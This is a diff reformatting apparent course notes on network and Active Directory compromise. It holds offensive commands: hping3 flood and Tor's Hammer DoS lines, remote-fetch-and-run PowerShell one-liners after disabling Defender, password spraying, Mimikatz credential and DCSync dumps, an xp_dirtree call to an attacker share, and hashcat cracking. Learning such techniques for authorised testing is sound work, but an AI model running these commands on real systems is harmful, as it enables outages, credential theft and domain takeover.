@@ -1,4 +1,6 @@
-# 02. Denial of Service 
+# SoftUni - System and Network Compromisig Notes
+
+## 02. Denial of Service 
 
 ```bash
 # View all open ports
@@ -8,25 +10,27 @@ ss -nltp
 netstat -ant
 ```
 
-## Tools that can be used to perform DoS attacks
+###  Tools that can be used to perform DoS attacks
 
 - **LOIC (Low Orbit Ion Cannon)**
 - **HOIC (High Orbit Ion Cannon)**
 - **hping3**
-  ```sudo hping3 -S --flood -V -p 80 <target> ```
-- **Tor's Hammer**
-  ```python torshammer.py -t <target> -r <threads>```
 
-## Other notes
+  ```sudo hping3 -S --flood -V -p 80 <target> ```
+
+- **Tor's Hammer**
+```python torshammer.py -t <target> -r <threads>```
+
+### Other notes
 
 ```bash
 # Check public IP
 curl ifconfig.me
 ```
 
-# 03. Scanning and Exploiting Network Services
+## 03. Scanning and Exploiting Network Services
 
-TODO: Research the difference between nmap and masscan.
+**TODO:** Research the difference between nmap and masscan.
 
 ### Tools for scanning and exploiting network services
 
@@ -47,7 +51,7 @@ nmap -p 443 --script=http-headers,http-title,http-generator
 nmap --script="default and http-*"
 ```
 
-TODO: research about scripts
+**TODO:** research about scripts
 
 ```bash
 # Masscan notes
@@ -81,6 +85,7 @@ Search for exploits in GitHub
 - company99
 
 ```Invoke-DomainPasswordSpray -UserList .\users.txt -Password 123456 -Verbose``` 
+
 ```bash
 #MimiKatz
 lsdump::setntlm /user:Audit2020 /ntlm:3a2e3f4a2e3f4a2e3f4a2e3f4a2e3f4a
@@ -146,7 +151,7 @@ vulnweb.com - Web application to practice web vulnerabilities
 - NTLM is weak to dictionary attacks
 - NTLM is weak to pass the hash attacks
 
-General Attacking aproaches
+### General Attacking aproaches
 
 1. Classical pentest evaluate service level vulnerabilities (metasploit, nmap, nessus)
 2. Password spraying (empty PW, company99, username=password)
@@ -157,56 +162,55 @@ General Attacking aproaches
 - Bloodhound (https://github.com/BloodHoundAD/BloodHound)
   - Bloodhound 4.2!!!
 
-```bash
-sudo apt install neo4j
-sudo neo4j start # or sudo neo4j console
-# Navigate to http://localhost:7474
-# default credentials: neo4j:neo4j
-# Install Bloodhound
-wget https://github.com/BloodHoundAD/BloodHound/releases/download/4.2.0/BloodHound-linux-x64.zip
-unzip BloodHound-linux-x64.zip
-cd BloodHound-linux-x64
-./BloodHound --disable-gpu-sandbox&
-# 
-# On windows machine import the data
-# Download SharpHound
-https://github.com/BloodHoundAD/SharpHound/releases/download/v1.1.0/SharpHound-v1.1.0.zip
+  ```bash
+  sudo apt install neo4j
+  sudo neo4j start # or sudo neo4j console
+  # Navigate to http://localhost:7474
+  # default credentials: neo4j:neo4j
+  # Install Bloodhound
+  wget https://github.com/BloodHoundAD/BloodHound/releases/download/4.2.0/BloodHound-linux-x64.zip
+  unzip BloodHound-linux-x64.zip
+  cd BloodHound-linux-x64
+  ./BloodHound --disable-gpu-sandbox&
+  # 
+  # On windows machine import the data
+  # Download SharpHound
+  https://github.com/BloodHoundAD/SharpHound/releases/download/v1.1.0/SharpHound-v1.1.0.zip
 
-.\SharpHound.exe
-# Upload data to Bloodhound
-# On the linux machine
-pip3 install uploadserver
-python3 -m uploadserver 80
-# Upload and Import data on URL http://<linux-ip>/upload
-# Drag and drop the zip file into the bloodhound web interface
-# After upload, go to Analisis
-```
+  .\SharpHound.exe
+  # Upload data to Bloodhound
+  # On the linux machine
+  pip3 install uploadserver
+  python3 -m uploadserver 80
+  # Upload and Import data on URL http://<linux-ip>/upload
+  # Drag and drop the zip file into the bloodhound web interface
+  # After upload, go to Analisis
+  ```
 
-!!! TODO: Own HTB Sauna machine and use Bloodhound
+**TODO:** Own HTB Sauna machine and use Bloodhound
   https://ippsec.rocks  - search for sauna
 
-
 - WinPwn (https://github.com/S3cur3Th1sSh1t/WinPwn)
-  - ADRecon
-  - MimiKatz
+- ADRecon
+- MimiKatz
 
-```powershell
-# Run as Administrator
-# Turn off Windows Defender
-iex (New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/S3cur3Th1sSh1t/WinPwn/master/Offline_WinPwn.ps1')
-# Run WinPwn
-winpwn
-# 16
-privilege::debug
-sekurlsa::logonpasswords
-# first option 3, then 2 (for password spraying)
-```
+  ```powershell
+  # Run as Administrator
+  # Turn off Windows Defender
+  iex (New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/S3cur3Th1sSh1t/WinPwn/master/Offline_WinPwn.ps1')
+  # Run WinPwn
+  winpwn
+  # 16
+  privilege::debug
+  sekurlsa::logonpasswords
+  # first option 3, then 2 (for password spraying)
+  ```
 
-```bash
-# On Kali using the hash
-impacket-psexec ...
-# Read the blog https://thehacker.recipes/ad/movement/ntlm/pth
-```
+  ```bash
+  # On Kali using the hash
+  impacket-psexec ...
+  # Read the blog https://thehacker.recipes/ad/movement/ntlm/pth
+  ```
 
 ### Repositories for VMs to practice Active Directory
 
@@ -219,75 +223,75 @@ impacket-psexec ...
  
 - Responder
 
-```bash
-sudo responder -I eth0
-```
+   ```bash
+  sudo responder -I eth0
+  ```
 
 - impacket-mssqlclient (https://github.com/fortra/impacket/blob/master/examples/mssqlclient.py)
 
-```bash
-impacket-mssqlclient 'DOMAIN/username@<target-ip>' -windows-auth
-```
+  ```bash
+  impacket-mssqlclient 'DOMAIN/username@<target-ip>' -windows-auth
+  ```
 
 - PowerUpSQL.ps1 (https://github.com/NetSPI/PowerUpSQL)
   PowerUpSQL Cheat Sheet (https://github.com/NetSPI/PowerUpSQL/wiki/PowerUpSQL-Cheat-Sheet)
 
-```powershell
-# On Windows
-iex (New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/NetSPI/PowerUpSQL/master/PowerUpSQL.ps1')
-Get-SQLInstanceDomain
-Invoke-SQLAudit -Instance <target-ip>
+  ```powershell
+  # On Windows
+  iex (New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/NetSPI/PowerUpSQL/master/PowerUpSQL.ps1')
+  Get-SQLInstanceDomain
+  Invoke-SQLAudit -Instance <target-ip>
 
-Get-SQLQuery -Instance <target-ip> -Query "EXEC master.sys.xp_dirtree '//<attacker-ip>/share',1,1"
-# On Kali if hash contains $ it means that it is for machine account
-```
+  Get-SQLQuery -Instance <target-ip> -Query "EXEC master.sys.xp_dirtree '//<attacker-ip>/share',1,1"
+  # On Kali if hash contains $ it means that it is for machine account
+  ```
 
 - WinPwn (https://github.com/S3cur3Th1sSh1t/WinPwn)
 
-```powershell
-# Run as Administrator
-# Turn off Windows Defender
-iex (New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/S3cur3Th1sSh1t/WinPwn/master/Offline_WinPwn.ps1')
-# Run WinPwn
-winpwn
-# 3 (Domain Recon)
-# 7 (PowerUpSQL Checks)
-```
+  ```powershell
+  # Run as Administrator
+  # Turn off Windows Defender
+  iex (New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/S3cur3Th1sSh1t/WinPwn/master/Offline_WinPwn. ps1')
+  # Run WinPwn
+  winpwn
+  # 3 (Domain Recon)
+  # 7 (PowerUpSQL Checks)
+  ```
 
 ### Optional tools and resources
 
 - hash_idenfier
 - https://hashcat.net/wiki/doku.php?id=example_hashes 
 
-```bash
-hashcat --example-hashes
-# Crack NTLMV1
-hashcat -m 5500 -a 0 hash.txt /usr/share/wordlists/rockyou.txt
-```
+  ```bash
+  hashcat --example-hashes
+  # Crack NTLMV1
+  hashcat -m 5500 -a 0 hash.txt /usr/share/wordlists/rockyou.txt
+  ```
 
 ### Tools for Password Spraying
 
 - DomainPasswordSpray (https://github.com/dafthack/DomainPasswordSpray)
 
-```powershell
-# On Windows
-iex (New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/dafthack/DomainPasswordSpray/master/DomainPasswordSpray.ps1') -outfile DomainPasswordSpray.ps1
-Import-Module .\DomainPasswordSpray.ps1
-Invoke-DomainPasswordSpray -Password "password"
-```
+  ```powershell
+  # On Windows
+  iex (New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/dafthack/DomainPasswordSpray/master/ DomainPasswordSpray.ps1') -outfile DomainPasswordSpray.ps1
+  Import-Module .\DomainPasswordSpray.ps1
+  Invoke-DomainPasswordSpray -Password "password"
+  ```
 
 - O365Spray (https://github.com/0xZDH/o365spray) - Out of Scope
 - WinPwn (https://github.com/S3cur3Th1sSh1t/WinPwn)
 
-```powershell
-# Run as Administrator
-# Turn off Windows Defender
-iex (New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/S3cur3Th1sSh1t/WinPwn/master/Offline_WinPwn.ps1')
-# Run WinPwn
-winpwn
-# 3 (Domain Recon)
-# 21 (Check username=password combinations!)
-```
+  ```powershell
+  # Run as Administrator
+  # Turn off Windows Defender
+  iex (New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/S3cur3Th1sSh1t/WinPwn/master/Offline_WinPwn. ps1')
+  # Run WinPwn
+  winpwn
+  # 3 (Domain Recon)
+  # 21 (Check username=password combinations!)
+  ```
 
 - TeamsFiltration (https://github.com/Flangvik/TeamFiltration)
 
@@ -311,15 +315,15 @@ https://s3cur3th1ssh1t.github.io/Building-a-custom-Mimikatz-binary/
 - DCSync
 - Mimikatz
 
-```powershell
-minikatz
-privilege::debug
-sekurlsa::logonpasswords
-# Perform DCSync
-lsadump::dcsync /domain:<FQDN> /user:username
-# Dump SAM database
-lsadump::sam
-```
+  ```powershell
+  minikatz
+  privilege::debug
+  sekurlsa::logonpasswords
+  # Perform DCSync
+  lsadump::dcsync /domain:<FQDN> /user:username
+  # Dump SAM database
+  lsadump::sam
+  ```
 
 - `impacket-secretsdump 'domain/username@<target-ip>' -hashes :NTLM`
 - CrackMapExec
